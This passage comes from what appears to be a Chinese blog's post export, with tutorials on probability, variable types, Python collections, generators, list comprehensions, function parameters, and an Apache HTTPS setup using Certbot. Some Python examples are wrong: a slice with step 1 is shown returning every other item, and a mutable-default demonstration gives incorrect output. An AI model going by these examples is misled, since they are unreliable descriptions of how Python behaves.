联合概率指两个事件共同发生的概率，比如A和B事件共同发生的概率表示为：\n联合概率的计算分为两种情况，一种为独立事件，比如前面掷骰子，计算公式则为多个独立事件事件的积，表示为：\n另一种则为相关事件，比如上面的抽球的例子，则可以通过反推来计算，表示为：\n这里这样计算是因为P(B|A)只得到了B在A发生后的概率，也就是在发生后的样本空间上计算的，所以P(B|A)表示的只有下图这么一部分发生的概率：\n而在这个时候乘以P(A)的概率，则就能表示如下这整个部分：\n全概率 导致一个事件发生的原因有很多种，那么该事件发生的概率就是每种原因引起该事件发生的概率总和，这句话能够很好的解释全概率。 而全概率公式就可以计算出一个事件的全部概率，公式为：\n而根据联合概率的计算方法，可以写成下面这样：\n还是拿红蓝球的例子来说，如果需要计算P(B)，这个时候可以利用全概率公式，则将能引起事件B发生的每个概率相加，即可得到P(B)。 在红篮球例子当中，引起事件B的原因有两种，分别为：先拿到红球，然后抽中蓝球的概率和先拿到蓝球抽中蓝球的概率。 根据图中第一种先拿到了红球引起B事件的发生的概率为 $(3/5) * (2/4) = 0.3$\n根据图中第二种先拿到了蓝球引起B事件的发生的概率为 $(2/5) * (1/4) = 0.1 $\n这个时候得到了所有能引起B事件发生的原因的概率，所以：\n$$ P(B) = 0.3 + 0.","title":"理解条件概率"},{"content":"统计学中，将一种类型的数据总称为变量，而变量的数据称为观测，而变量的具体取值为观测值，比如下面的数据中，age和name都是变量，而18和’大红’都具体的取值被称为观测值。\nage,name 18,’大红’ 21,’小花’ 同理，在统计学中，离散数据也被称为离散变量，连续数据也被称为连续变量，而如何区分两种变量的区别？ 连续变量可以理解为取值范围在理论上是连续不断的，而离散变量则可以理解为取值范围是间断不连续的，他们之间的区别并无数量之分，都是无穷个。 比如家庭数量人口只有1、2、3、4个人口，不可能为1.2、1.8、2.4这样来表示人口，所以家庭人口是离散变量。 而年龄取值上通常为了方便而说是18岁、17岁、30岁，但是如果按照实际取值，则可以取为18.32、17.55、30.67岁，17.55岁则表示年龄为17岁6个月18天，而且出生的时间还可以精确到小时、分、秒等单位，所以年龄为连续变量。\n参考资料 关于连续和离散的理解 定量和定性变量、连续和离散变量，到底怎么分？ 图解概率笔记：葉丙成概率公开课 ","permalink":"/posts/continuous-data-and-discrete-data/","summary":"统计学中，将一种类型的数据总称为变量，而变量的数据称为观测，而变量的具体取值为观测值，比如下面的数据中，age和name都是变量，而18和’大红’都具体的取值被称为观测值。\nage,name 18,’大红’ 21,’小花’ 同理，在统计学中，离散数据也被称为离散变量，连续数据也被称为连续变量，而如何区分两种变量的区别？ 连续变量可以理解为取值范围在理论上是连续不断的，而离散变量则可以理解为取值范围是间断不连续的，他们之间的区别并无数量之分，都是无穷个。 比如家庭数量人口只有1、2、3、4个人口，不可能为1.2、1.8、2.4这样来表示人口，所以家庭人口是离散变量。 而年龄取值上通常为了方便而说是18岁、17岁、30岁，但是如果按照实际取值，则可以取为18.32、17.55、30.67岁，17.55岁则表示年龄为17岁6个月18天，而且出生的时间还可以精确到小时、分、秒等单位，所以年龄为连续变量。\n参考资料 关于连续和离散的理解 定量和定性变量、连续和离散变量，到底怎么分？ 图解概率笔记：葉丙成概率公开课 ","title":"理解连续数据和离散数据"},{"content":"列表 列表是有序可变的数据集合，并且一对[]来表示这是一个列表，元素之间逗号分隔，每个数据之间有逗号分隔，列表基本上可以包含很多数据类型，下面就是一个典型的列表：\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] 在上面的列表中存储了数据(整型、浮点型、字符串、布尔值)，包含我们下面看见的几种集合类型都是可以当作列表的子元素的。\n当然也可以从列表中取出数据，因为列表是有序的，所以我们可以通过索引从0开始进行取数据,你需要注意的是所有可以用索引进行得到值的都是从0开始，比如下面的代码取出了列表第一个和第三个数据。\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] list[0] # 1 list[2] # \u0026#39;ok\u0026#39; 除了0开始的整数，还可以用负数，比如-1表示倒数第一个值，-2表示倒数第二个值，以此类推。\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] list[-1] # bool list[-2] # \u0026#39;ok\u0026#39; 列表切片 除此之外，列表还支持切片的功能，就相当于一块肉，我们通过菜刀把这块肉切成一片一片的，方便我们炒菜（方便处理）。切片同样和索引一样存在列表变量名后的[]里面，大概语法如下：\nlist[起始位置:截至位置(但不包括本位置的值):步数] 下面的代码我获取了从第一个到第四个的值（但不包括第四个值）：\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] list[0:3] # 1,2.2,\u0026#39;ok\u0026#39; 也可以设置步数，作用就是比如我们设置2，就会每隔两个值就返回一个值：\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] list[0:4:1] #[1, \u0026#39;ok\u0026#39;] 当然同样可以设置负数，可以自行测试！\n列表查询 列表查询可以用于判断一个值是否在列表当中，通过in和not in来进行，其中in表示一个值是否包含在列表当中，如果包含则返回True，反之返回False，而not in则是对in的结果进行取反，比如下面的代码则表示了判断值2.2是不是存在于列表当中以及对in结果进行取反。\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] print(2.2 in list) #返回 True print(2.2 not in list) #返回False 元组 元组是有序不可变的数据集合，并且用一对()来进行表示，元素之间逗号分隔，当你定义好元组那一刻，元组里面的所有数据就不能够进行修改了，你只能读取里面的数据而无法修改和添加数据，比如下面，我定义了一组元组后，我通过修改第一个元素产生错误：\ntple = (1,2,3,4) tple[0] # 1 tple[0] = \u0026#39;m\u0026#39; \u0026#34;\u0026#34;\u0026#34; Traceback (most recent call last): File \u0026#34;\u0026lt;ipython-input-21-cae8ab2b1ade\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; tple[0] = m TypeError: \u0026#39;tuple\u0026#39; object does not support item assignment 在上面这一行就会明显提醒你tuple对象不支持修改。 \u0026#34;\u0026#34;\u0026#34; 集合 集合是可变无序的数据集合，并且用一对{}表示，元素之间逗号分隔，还需要特别注意的是集合是一个包含唯一元素的可变无序集合数据类型,集合的一个用途是快速删除列表中的重复项 ，集合是无序的，既然是无序那么就没有办法进行索引，我们只能通过两个方法进行添加和删除数据并返回，添加通过add()方法，删除是pop()方法，添加是随机插入到集合当中的任何位置，而删除是从集合当中随机取出一个值删除并返回。比如下面的操作：\ncoll = {1,2,3,4,5,5} print(coll) # {1,2,3,4,5} 这里只返回了一个5，另外一个5已经被去重了 coll.add(7) # {1,2,3,4,5,7} # 添加一个元素，虽然看着像有序列表，但是千万不要试图把集合用作有序集合来使用。 coll.pop() # {2,3,4,5,7} 集合同样支持in和not in操作，来判断值是否包含在集合当中。\n字典 字典是可变无序的数据集合，其中存储的是键值对的形式进行存储的，比如下面的代码就是一个字典：\ndic = { \u0026#39;a\u0026#39;: 1, \u0026#39;b\u0026#39;: 2, \u0026#39;c\u0026#39;: 3 } 字典的键可以是任何不可变类型，例如整数或元组，而不仅仅是字符串。甚至每个键都不一定要是相同的类型！我们可以使用方括号并在括号里放入键，查询字典中的值或向字典中插入新值。\ndic = { \u0026#39;a\u0026#39;: 1, \u0026#39;b\u0026#39;: 2, \u0026#39;c\u0026#39;: 3 } dic[\u0026#39;a\u0026#39;] # 1 如何你需要在字典中查询一个键是否存在，可以使用in和not in，根据返回的True和False可以做出相应的判断，如果还需要查询值，除了可以通过上面的['key']之外，还可以使用get()方法进行查询，如没有找到相应的键返回就返回None类型值，表示没有值：\ndic = { \u0026#39;a\u0026#39;: 1, \u0026#39;b\u0026#39;: 2, \u0026#39;c\u0026#39;: 3 } dic.get(\u0026#39;a\u0026#39;) # 1 dic.get(\u0026#39;dd\u0026#39;) # None ","permalink":"/posts/python-list/","summary":"列表 列表是有序可变的数据集合，并且一对[]来表示这是一个列表，元素之间逗号分隔，每个数据之间有逗号分隔，列表基本上可以包含很多数据类型，下面就是一个典型的列表：\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] 在上面的列表中存储了数据(整型、浮点型、字符串、布尔值)，包含我们下面看见的几种集合类型都是可以当作列表的子元素的。\n当然也可以从列表中取出数据，因为列表是有序的，所以我们可以通过索引从0开始进行取数据,你需要注意的是所有可以用索引进行得到值的都是从0开始，比如下面的代码取出了列表第一个和第三个数据。\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] list[0] # 1 list[2] # \u0026#39;ok\u0026#39; 除了0开始的整数，还可以用负数，比如-1表示倒数第一个值，-2表示倒数第二个值，以此类推。\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] list[-1] # bool list[-2] # \u0026#39;ok\u0026#39; 列表切片 除此之外，列表还支持切片的功能，就相当于一块肉，我们通过菜刀把这块肉切成一片一片的，方便我们炒菜（方便处理）。切片同样和索引一样存在列表变量名后的[]里面，大概语法如下：\nlist[起始位置:截至位置(但不包括本位置的值):步数] 下面的代码我获取了从第一个到第四个的值（但不包括第四个值）：\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] list[0:3] # 1,2.2,\u0026#39;ok\u0026#39; 也可以设置步数，作用就是比如我们设置2，就会每隔两个值就返回一个值：\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] list[0:4:1] #[1, \u0026#39;ok\u0026#39;] 当然同样可以设置负数，可以自行测试！\n列表查询 列表查询可以用于判断一个值是否在列表当中，通过in和not in来进行，其中in表示一个值是否包含在列表当中，如果包含则返回True，反之返回False，而not in则是对in的结果进行取反，比如下面的代码则表示了判断值2.2是不是存在于列表当中以及对in结果进行取反。\nlist = [1,2.2,\u0026#39;ok\u0026#39;,bool] print(2.2 in list) #返回 True print(2.2 not in list) #返回False 元组 元组是有序不可变的数据集合，并且用一对()来进行表示，元素之间逗号分隔，当你定义好元组那一刻，元组里面的所有数据就不能够进行修改了，你只能读取里面的数据而无法修改和添加数据，比如下面，我定义了一组元组后，我通过修改第一个元素产生错误：\ntple = (1,2,3,4) tple[0] # 1 tple[0] = \u0026#39;m\u0026#39; \u0026#34;\u0026#34;\u0026#34; Traceback (most recent call last): File \u0026#34;\u0026lt;ipython-input-21-cae8ab2b1ade\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; tple[0] = m TypeError: \u0026#39;tuple\u0026#39; object does not support item assignment 在上面这一行就会明显提醒你tuple对象不支持修改。 \u0026#34;\u0026#34;\u0026#34; 集合 集合是可变无序的数据集合，并且用一对{}表示，元素之间逗号分隔，还需要特别注意的是集合是一个包含唯一元素的可变无序集合数据类型,集合的一个用途是快速删除列表中的重复项 ，集合是无序的，既然是无序那么就没有办法进行索引，我们只能通过两个方法进行添加和删除数据并返回，添加通过add()方法，删除是pop()方法，添加是随机插入到集合当中的任何位置，而删除是从集合当中随机取出一个值删除并返回。比如下面的操作：","title":"Python数据集合"},{"content":"算术运算符 + 加 - 减 * 乘 / 除 % 取余（相除后的余数） ** 取幂（注意 ^ 并不执行该运算，你可能在其他语言中见过这种情形） // 相除后向下取整到最接近的整数 整数、浮点数 数字值可以用到两种 python 数据类型：\nint - 表示整数值 float - 表示小数或浮点数值 你可以通过以下语法创建具有某个数据类型的值：\nx = int(4.7) # x is now an integer 4 y = float(4) # y is now a float of 4.0 你可以使用函数 type 检查数据类型：\n\u0026gt;\u0026gt;\u0026gt; print(type(x)) int \u0026gt;\u0026gt;\u0026gt; print(type(y)) float 布尔型运算符、比较运算符和逻辑运算符 布尔数据类型存储的是值 True 或 False，通常分别表示为 1 或 0。\n通常有 6 个比较运算符会获得布尔值：\n比较运算符 符号使用情况\n布尔型\n运算符\n5 \u0026lt; 3\nFalse\n小于\n5 \u0026gt; 3\nTrue\n大于\n3 \u0026lt;= 3\nTrue\n小于或等于\n3 \u0026gt;= 5\nFalse\n大于或等于\n3 == 5\nFalse\n等于\n3 != 5\nTrue\n不等于\n你需要熟悉三个逻辑运算符：\n逻辑使用情况\n布尔型\n运算符\n5 \u0026lt; 3 and 5 == 5\nFalse\nand - 检查提供的所有语句是否都为 True\n5 \u0026lt; 3 or 5 == 5\nTrue\nor - 检查是否至少有一个语句为 True\nnot 5 \u0026lt; 3\nTrue\nnot - 翻转布尔值\n字符串 在 python 中，字符串的变量类型显示为 str。你可以使用双引号 \u0026quot; 或单引号 ' 定义字符串。如果你要创建的字符串包含其中一种引号，你需要确保代码不会出错。\n\u0026gt;\u0026gt;\u0026gt; my_string = \u0026#39;this is a string!\u0026#39; \u0026gt;\u0026gt;\u0026gt; my_string2 = \u0026#34;this is also a string!!!\u0026#34; 你还可以在字符串中使用 ，以包含其中一种引号：\n\u0026gt;\u0026gt;\u0026gt; this_string = \u0026#39;Simon\u0026#39;s skateboard is in the garage.\u0026#39; \u0026gt;\u0026gt;\u0026gt; print(this_string) Simon\u0026#39;s skateboard is in the garage. 如果不使用 ，注意我们遇到了以下错误：\n\u0026gt;\u0026gt;\u0026gt; this_string = \u0026#39;Simon\u0026#39;s skateboard is in the garage.\u0026#39; File \u0026#34;\u0026lt;ipython-input-20-e80562c2a290\u0026gt;\u0026#34;, line 1 this_string = \u0026#39;Simon\u0026#39;s skateboard is in the garage.\u0026#39; ^ SyntaxError: invalid syntax 备注 所有的文字均来自优达学城，本人也是其中的学员，记录这一部分的原因是因为内容比较简单，但是毕竟容易忘记，所有就筛选了部分内容进行记录，方便查阅。如果有任何侵权问题，请联系我\n","permalink":"/posts/python-datatype/","summary":"算术运算符 + 加 - 减 * 乘 / 除 % 取余（相除后的余数） ** 取幂（注意 ^ 并不执行该运算，你可能在其他语言中见过这种情形） // 相除后向下取整到最接近的整数 整数、浮点数 数字值可以用到两种 python 数据类型：\nint - 表示整数值 float - 表示小数或浮点数值 你可以通过以下语法创建具有某个数据类型的值：\nx = int(4.7) # x is now an integer 4 y = float(4) # y is now a float of 4.0 你可以使用函数 type 检查数据类型：\n\u0026gt;\u0026gt;\u0026gt; print(type(x)) int \u0026gt;\u0026gt;\u0026gt; print(type(y)) float 布尔型运算符、比较运算符和逻辑运算符 布尔数据类型存储的是值 True 或 False，通常分别表示为 1 或 0。\n通常有 6 个比较运算符会获得布尔值：\n比较运算符 符号使用情况","title":"Python数据类型与操作符"},{"content":"环境 CentOS Linux release 7.5.1804 Apache/2.4.6 (CentOS) root用户 前言 首先我们需要建立vhost文件，在目前的环境中安装的Apache会自动把目录为/etc/httpd/conf.d下的所有*.conf文件引入到配置文件/etc/httpd/conf/httpd.conf中加载，所以我们只需要在/etc/httpd/conf.d目录下配置我们的虚拟主机文件。\n免费的证书我们可以通过证书授权机构Let’s Encrypt 获取，并且我们可以通过Certbot（由Let’s Encrypt推出的获取证书的客户端 ）进行生成证书，Certbot提供了几种方式进行生产，我们选择最简单的方式certbot-auto来进行自动配置\n0x0001 通过编辑器编辑vhost文件\nvim /etc/httpd/conf.d/vhost.conf 添加以下的内容，括号及括号内的内容自行去掉\n\u0026lt;VirtualHost *:80\u0026gt; ServerAdmin XXX@xxx.cn(邮箱) directoryIndex index.html index.php index.htm ServerName XXXX.com(域名) DocumentRoot /www/web(网站目录) \u0026lt;Directory \u0026#34;/www/web(网站目录)\u0026#34;\u0026gt; Options -Indexes AllowOverride All Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; 添加完内容后进行保存，并且我们用下面的命令来检查配置文件的语法是否有错误\nhttpd -t 如果测试是没有问题的，此时我们就可以重启服务器让配置文件生效\nsystemctl restart httpd 0x0002 这一步我们进行配置https，我们这里使用的是文章最开始提到的自动安装脚本，其他的安装方式以及如果文章离你查看的时间比较久远，建议你参照Certbot官方进行配置。\n首先下载Certbot到当前目录下，并让Certbot具有执行权限\nwget https://dl.eff.org/certbot-auto chmod a+x certbot-auto 执行当前目录下的certbot-auto，然后跟着提示操作就可以执行了\ncertbot-auto --apache 0X0003 我们可以通过renew进行查看证书的有效期，还可以通过renew --dry-run命令来更新证书，如果你需要自动更新可以参照官网或者其他脚本程序来进行实现也是没有任何问题的\ncertbot-auto renew 查看证书有效期 certbot-auto renew --dry-run 更新证书有效期 ","permalink":"/posts/apache2-https/","summary":"环境 CentOS Linux release 7.5.1804 Apache/2.4.6 (CentOS) root用户 前言 首先我们需要建立vhost文件，在目前的环境中安装的Apache会自动把目录为/etc/httpd/conf.d下的所有*.conf文件引入到配置文件/etc/httpd/conf/httpd.conf中加载，所以我们只需要在/etc/httpd/conf.d目录下配置我们的虚拟主机文件。\n免费的证书我们可以通过证书授权机构Let’s Encrypt 获取，并且我们可以通过Certbot（由Let’s Encrypt推出的获取证书的客户端 ）进行生成证书，Certbot提供了几种方式进行生产，我们选择最简单的方式certbot-auto来进行自动配置\n0x0001 通过编辑器编辑vhost文件\nvim /etc/httpd/conf.d/vhost.conf 添加以下的内容，括号及括号内的内容自行去掉\n\u0026lt;VirtualHost *:80\u0026gt; ServerAdmin XXX@xxx.cn(邮箱) directoryIndex index.html index.php index.htm ServerName XXXX.com(域名) DocumentRoot /www/web(网站目录) \u0026lt;Directory \u0026#34;/www/web(网站目录)\u0026#34;\u0026gt; Options -Indexes AllowOverride All Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; 添加完内容后进行保存，并且我们用下面的命令来检查配置文件的语法是否有错误\nhttpd -t 如果测试是没有问题的，此时我们就可以重启服务器让配置文件生效\nsystemctl restart httpd 0x0002 这一步我们进行配置https，我们这里使用的是文章最开始提到的自动安装脚本，其他的安装方式以及如果文章离你查看的时间比较久远，建议你参照Certbot官方进行配置。\n首先下载Certbot到当前目录下，并让Certbot具有执行权限\nwget https://dl.eff.org/certbot-auto chmod a+x certbot-auto 执行当前目录下的certbot-auto，然后跟着提示操作就可以执行了\ncertbot-auto --apache 0X0003 我们可以通过renew进行查看证书的有效期，还可以通过renew --dry-run命令来更新证书，如果你需要自动更新可以参照官网或者其他脚本程序来进行实现也是没有任何问题的\ncertbot-auto renew 查看证书有效期 certbot-auto renew --dry-run 更新证书有效期 ","title":"Apache2-https安装教程"},{"content":"什么是生成器(generator)？ 在Python中提供了一种名为generator的对象，他是通过next函数去中断执行并且generator对象具有Iterable对象，也就是说可以用于for循环，generator最大的作用是按需生成值，这个是什么意思呢？当我们需要一组元素很多的列表的时候会占用很大的内存，比如你需要生成一组从0-100000的列表，那么这个列表的长度将有10万，这是多么大的列表？如果比这个数值更大呢？那么很大一部分内存都将用来保存这个列表。\nlist(range(100000)) 类似于上面这样的情况，我们可以用generator对象来按需生成数值来供我们处理，你可以把generator对象理解为一种状态机，里面保存着每次执行后的状态而并不是一次性的生成所有的值，我们就相当于导演，generator对象就像一个演员，我们叫他cut的时候，他就会停止，这样的好处就是一次性只返回一个或少量的值，不会一次性大量生成所有的值而导致内存的紧缺。\n生成器(generator)函数 生成器函数和普通函数很相似，为什么？因为你看见一个函数内部只要出现yield标识符，那么这个函数肯定就是generator对象函数，比如下面的代码：\n#普通函数 def ad(a,b): return a + b #generator函数 def ad(a,b): yield a + b return None 但是他们的执行过程却不一样，普通函数调用过后就马上执行内部的代码并返回，而generator对象函数却是保存了内部的状态，等待你需要的时候再去执行，而执行我们通过next函数去调用并且在内部执行的时候遇见了下一个yield标识符就会停止执行并返回yield标识符后面的值。\n#普通函数 def ad(a,b): return a + b #generator函数 def ad(a,b): yield a + b return None #普通函数执行 ad(1,5) #6 b = ad(1,5) #此时保存了状态 next(b) #6 通过next函数调用generator函数执行 生成器(generator)表达式 生成器表达式和列表表达式很像，但是有一点不同的是列表表达式由[]组成，而生成器表达式由()组成，就像下面的代码一样：\nl = [x * x for x in range(5)] #列表表达式 g = (x * x for x in range(5)) #生成器表达式 generator对象是需要通过next函数调用执行，并且返回的值是按循环生成的每个元素，我们每次用next执行我们的generator对象后，generator对象会保存执行后的状态，直到没有元素或者遇见return语句后抛出一个StopIteration错误来表示已经执行完毕，下面的代码是通过手动执行generator对象和通过for自动执行。\ng = (x for x in range(5)) #生成器表达式 next(g) #0 next(g) #1 next(g) #2 next(g) #3 next(g) #4 next(g) # Traceback (most recent call last): File \u0026#34;\u0026lt;ipython-input-18-e734f8aca5ac\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; next(g) StopIteration 从上面的代码看出来当我们调用内部的代码已经执行完了后，我们再次执行就会扔出StopIteration类型的错误，当然我们也可以直接给next设置默认返回值，当执行完内部的所有代码后就会返回这个默认值\ng = (x for x in range(5)) #生成器表达式 next(g,\u0026#39;ok\u0026#39;) #0 next(g,\u0026#39;ok\u0026#39;) #1 next(g,\u0026#39;ok\u0026#39;) #2 next(g,\u0026#39;ok\u0026#39;) #3 next(g,\u0026#39;ok\u0026#39;) #4 next(g,\u0026#39;ok\u0026#39;) #返回 \u0026#39;ok\u0026#39; ","permalink":"/posts/python-generator/","summary":"什么是生成器(generator)？ 在Python中提供了一种名为generator的对象，他是通过next函数去中断执行并且generator对象具有Iterable对象，也就是说可以用于for循环，generator最大的作用是按需生成值，这个是什么意思呢？当我们需要一组元素很多的列表的时候会占用很大的内存，比如你需要生成一组从0-100000的列表，那么这个列表的长度将有10万，这是多么大的列表？如果比这个数值更大呢？那么很大一部分内存都将用来保存这个列表。\nlist(range(100000)) 类似于上面这样的情况，我们可以用generator对象来按需生成数值来供我们处理，你可以把generator对象理解为一种状态机，里面保存着每次执行后的状态而并不是一次性的生成所有的值，我们就相当于导演，generator对象就像一个演员，我们叫他cut的时候，他就会停止，这样的好处就是一次性只返回一个或少量的值，不会一次性大量生成所有的值而导致内存的紧缺。\n生成器(generator)函数 生成器函数和普通函数很相似，为什么？因为你看见一个函数内部只要出现yield标识符，那么这个函数肯定就是generator对象函数，比如下面的代码：\n#普通函数 def ad(a,b): return a + b #generator函数 def ad(a,b): yield a + b return None 但是他们的执行过程却不一样，普通函数调用过后就马上执行内部的代码并返回，而generator对象函数却是保存了内部的状态，等待你需要的时候再去执行，而执行我们通过next函数去调用并且在内部执行的时候遇见了下一个yield标识符就会停止执行并返回yield标识符后面的值。\n#普通函数 def ad(a,b): return a + b #generator函数 def ad(a,b): yield a + b return None #普通函数执行 ad(1,5) #6 b = ad(1,5) #此时保存了状态 next(b) #6 通过next函数调用generator函数执行 生成器(generator)表达式 生成器表达式和列表表达式很像，但是有一点不同的是列表表达式由[]组成，而生成器表达式由()组成，就像下面的代码一样：\nl = [x * x for x in range(5)] #列表表达式 g = (x * x for x in range(5)) #生成器表达式 generator对象是需要通过next函数调用执行，并且返回的值是按循环生成的每个元素，我们每次用next执行我们的generator对象后，generator对象会保存执行后的状态，直到没有元素或者遇见return语句后抛出一个StopIteration错误来表示已经执行完毕，下面的代码是通过手动执行generator对象和通过for自动执行。","title":"Python生成器"},{"content":"如何生成列表？ 先试想一下，如果你需要生成1-50的数值列表，如果没有列表生成式你将会这样来做：\nx = [] i = 1 while i \u0026lt;= 50: x.append(i) i += 1 还有一种方法就是通过range函数生成整数数列，然后通过list函数生成一个列表返回，大概操作如下：\nlist(range(0,50)) 当然range函数提供了第三个参数，用于设置步数，你可以理解为间隔数，比如我只需要返回0-50中的偶尔，那么我用range生成的数列需要每隔两个数生成一个：\nlist(range(0,50,2)) 列表生成表达式 列表生成式是Python内置的\u0026rsquo;列表\u0026rsquo;生成器，那列表生成表达式有什么用？首先我们尝试解决上面的第一个问题：\n[x for x in range(0,50)] 那如果要生成0-50每个数的乘积怎么做？可以像下面的代码一样来做：\n[x * x for x in range(0,50)] 那如果要生成0-50的数列，但是在其中40数值不需要生成，就可以在表达式中使用判断：\n[x for x in range(0,50) if x != 40] 这种使用方法也是最常用的，其他的多层循环不去说明，因为多层循环在表达式中使用，结构化并不清晰，容易造成歧义。\n现在我们大概看出来了列表生成表达式的使用方法，整理一下可以大概理解为：\n[x for x in range(0,50) if x != 50] [生成的值 可迭代对象 条件语句] 可迭代对象 什么是可迭代对象？你可以直接理解为可用于for循环的对象都可以叫为可迭代对象，那我们怎么知道哪些对象是可以迭代的？我们可以通过isinstance检查目前的集合类型的数据是否具有collections模块中Iterable对象，如果有那么就可以进行迭代：\nfrom collections import Iterable isinstance([], Iterable) # True isinstance({}, Iterable) #True isinstance(100, Iterable) #false 从上面看字典也是可以进行迭代的，下面的代码就是列表表达式对字典进行处理生成列表，并将首字母更改为大写，并且下面是在列表生成表达式中产生了两个变量。\ndc = {\u0026#39;k\u0026#39;: \u0026#39;this is k\u0026#39;, \u0026#39;l\u0026#39;: \u0026#39;this is l\u0026#39;} dc_list = [\u0026#39;{}: {}\u0026#39;.format(k.capitalize(),v.capitalize()) for k,v in dc.items()] print(dc_list) #[\u0026#39;K: This is k\u0026#39;, \u0026#39;L: This is l\u0026#39;] ","permalink":"/posts/python-list-render/","summary":"如何生成列表？ 先试想一下，如果你需要生成1-50的数值列表，如果没有列表生成式你将会这样来做：\nx = [] i = 1 while i \u0026lt;= 50: x.append(i) i += 1 还有一种方法就是通过range函数生成整数数列，然后通过list函数生成一个列表返回，大概操作如下：\nlist(range(0,50)) 当然range函数提供了第三个参数，用于设置步数，你可以理解为间隔数，比如我只需要返回0-50中的偶尔，那么我用range生成的数列需要每隔两个数生成一个：\nlist(range(0,50,2)) 列表生成表达式 列表生成式是Python内置的\u0026rsquo;列表\u0026rsquo;生成器，那列表生成表达式有什么用？首先我们尝试解决上面的第一个问题：\n[x for x in range(0,50)] 那如果要生成0-50每个数的乘积怎么做？可以像下面的代码一样来做：\n[x * x for x in range(0,50)] 那如果要生成0-50的数列，但是在其中40数值不需要生成，就可以在表达式中使用判断：\n[x for x in range(0,50) if x != 40] 这种使用方法也是最常用的，其他的多层循环不去说明，因为多层循环在表达式中使用，结构化并不清晰，容易造成歧义。\n现在我们大概看出来了列表生成表达式的使用方法，整理一下可以大概理解为：\n[x for x in range(0,50) if x != 50] [生成的值 可迭代对象 条件语句] 可迭代对象 什么是可迭代对象？你可以直接理解为可用于for循环的对象都可以叫为可迭代对象，那我们怎么知道哪些对象是可以迭代的？我们可以通过isinstance检查目前的集合类型的数据是否具有collections模块中Iterable对象，如果有那么就可以进行迭代：\nfrom collections import Iterable isinstance([], Iterable) # True isinstance({}, Iterable) #True isinstance(100, Iterable) #false 从上面看字典也是可以进行迭代的，下面的代码就是列表表达式对字典进行处理生成列表，并将首字母更改为大写，并且下面是在列表生成表达式中产生了两个变量。","title":"Python 列表生成表达式"},{"content":"位置参数 位置参数是指定了多少参数，就必须输入多少参数，否则就会报错。也可以把位置参数理解为必须参数，如果没有输入同等的参数，就会报错，比如下面的代码，计算两个数的乘积。\ndef power(x,y): return x * y power(2,5) # 10 power(2) #报错 默认参数 默认参数指的是可以给一个参数设置一个默认值，如果用户没有输入这个参数，那么在函数内部就会用这个参数设置的默认值进行计算，比如说下面的函数是返回两个数的乘积，如果用户没有输入第二个数，就默认为数值'2\u0026rsquo;。\ndef power(x,y=2): return x * y power(2,5) # 10 power(2) # 4 可变参数 可变参数是定义函数的时候不确定函数有多少个值，但是都会去接收进行计算，在函数内部是把所有的参数组合成一个不可变的元组数列。\n可以把可变参数理解为函数参数的个数是可以不固定的，比如计算用户输入的所有数值之和，此时的参数是不可控的，这种情况就可以使用可变参数，比如下面的代码是计算用户输入的所有数值之和。\n# 可变参数通过参数名前输入一个\u0026#39;*\u0026#39;号，标记为这是一个可变参数 def power(*num): sum = 0 for x in num: sum += x return sum power(2,5) # 7 power(2) # 2 power(2,5,6,7,8,9,10,22) # 69 关键字参数 关键字参数允许传入任意个含参数名的参数与值，并在内部自动组成一个dict类型的数据，比如我需要处理一些注册的信息，但是只有名字是必须的，其他的都是可选的，你可以把关键字参数理解为以name=value形式的这样的参数的个数是不固定的参数。\n比如下面的代码就是处理一个注册的信息，如果有人填了选填的部分，就把参数传入到函数进行处理。\n# 可变参数通过参数名前输入一个\u0026#39;**\u0026#39;号，标记为这是一个关键字参数，并传入name=value形式的参数 def power(name,**other): print(\u0026#39;name:{}, other:{}\u0026#39;.format(name,other)) power(\u0026#39;trick\u0026#39;, a=1,b=2) # name:trick, other:{\u0026#39;a\u0026#39;: 1, \u0026#39;b\u0026#39;: 2} 命名关键字参数 命名关键字参数是对于关键字参数的补充，当定义关键字参数的时候我们是没有办法对关键字参数可控的，而命名关键字参数就可以控制关键字参数的名字以及接收关键字的个数，比如下面的代码只接收\u0026rsquo;city\u0026rsquo;和\u0026rsquo;email\u0026rsquo;两个关键字参数。\n#命名关键字参数需要在可控关键字参数前面加一个逗号和一个*号 def power(name, *, city, email): print(\u0026#39;name:{}, city:{}, email:{}\u0026#39;.format(name, city, email)) power(\u0026#39;trick\u0026#39;, city=\u0026#39;bj\u0026#39;, email=\u0026#39;xx@gmail.com\u0026#39;) # name:trick, city:bj, email:xx@gmail.com 函数参数的一些注意点 在函数中可以组合使用上面5种参数，但是请注意，参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。\n除此之外在定义默认参数的时候需要注意，如果你定义的是一个引用型对象，比如列表，就会出现类似下面的这样的问题：\ndef power(a=[]): a.append(\u0026#39;qwe\u0026#39;) return a print(power([1,2,3,4])) # [1, 2, 3, 4, \u0026#39;qwe\u0026#39;] 返回正确 print(power([])) # [\u0026#39;qwe\u0026#39;] 返回正确 print(power([])) # [\u0026#39;qwe\u0026#39;,\u0026#39;qwe\u0026#39;] 在执行一次就出现了问题 上面代码执行无参数调用的第二次就出现了问题，这是因为当我们定义函数的时候，Python解释器执行到这里的时候就为参数a创建一个列表，然后每次我们不输入参数的时候，实际上是返回这个默认参数的列表，所以我们每次不输入参数的时候就会忘默认参数的列表里面添加一个\u0026rsquo;qwe\u0026rsquo;。\n要解决这样的问题我们需要换一个方法来进行，可以设定一个默认值(None)，然后在函数体内部判断是否是None，如果是就创建一个新列表并返回。\ndef power(a=None): if a is None: a = [] a.append(\u0026#39;qwe\u0026#39;) return a print(power([1,2,3])) # [1, 2, 3, \u0026#39;qwe\u0026#39;] print(power()) # [\u0026#39;qwe\u0026#39;] print(power()) # [\u0026#39;qwe\u0026#39;] 